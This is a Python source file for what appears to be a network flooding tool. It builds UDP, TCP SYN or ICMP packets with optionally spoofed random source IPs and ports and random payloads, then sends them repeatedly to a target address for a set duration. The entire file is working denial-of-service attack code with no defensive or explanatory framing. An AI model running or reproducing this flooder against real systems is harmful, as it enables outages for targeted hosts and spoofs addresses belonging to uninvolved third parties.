from random import randint
from time import time, sleep
from enum import Enum
from packets import *


def getRandomIp():
    return "%i.%i.%i.%i" % (randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))


def getRandomPort():
    return randint(1, 65535)


def getRandomData(data_length):
    return ''.join([str(randint(1, 254)) for i in xrange(data_length)])


class AttackType(Enum):
    UDP = 1
    TCP = 2
    ICMP = 3


funcs = {AttackType.UDP: getUdpPacket, AttackType.TCP: getTcpSynPacket, AttackType.ICMP: getIcmpPacket}


def getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip, source_port,
              destination_ip, destination_port, data_length):
    if random_source_ip:
        sIp = getRandomIp()
    else:
        sIp = source_ip
    if random_source_port:
        sP = getRandomPort()
    else:
        sP = source_port
    if random_destination_port:
        dP = getRandomPort()
    else:
        dP = destination_port
    return getPacketFunc(srcIp=sIp, dstIp=destination_ip, srcPort=sP, dstPort=dP, data=getRandomData(data_length))


def startAttack(type, duration, interval, random_source_ip, random_source_port, random_destination_port, source_ip,
                source_port, destination_ip, destination_port, data_length):
    usedRandom = random_source_ip or random_source_port or random_destination_port
    sock = getSocket()
    # getPacketFunc = funcs[type]
    if type == AttackType.UDP:
        getPacketFunc = getUdpPacket
    if type == AttackType.TCP:
        getPacketFunc = getTcpSynPacket
    if type == AttackType.ICMP:
        getPacketFunc = getIcmpPacket
    else:
        getPacketFunc = getUdpPacket
    packet = getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip,
                       source_port, destination_ip, destination_port, data_length)
    amount = duration
    endTime = time() + amount
    counter = 0
    while time() < endTime:
        sock.sendto(packet, (destination_ip, 0 ))
        counter += 1
        sleep(interval)
        if usedRandom:
            packet = getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip,
                               source_port, destination_ip, destination_port, data_length)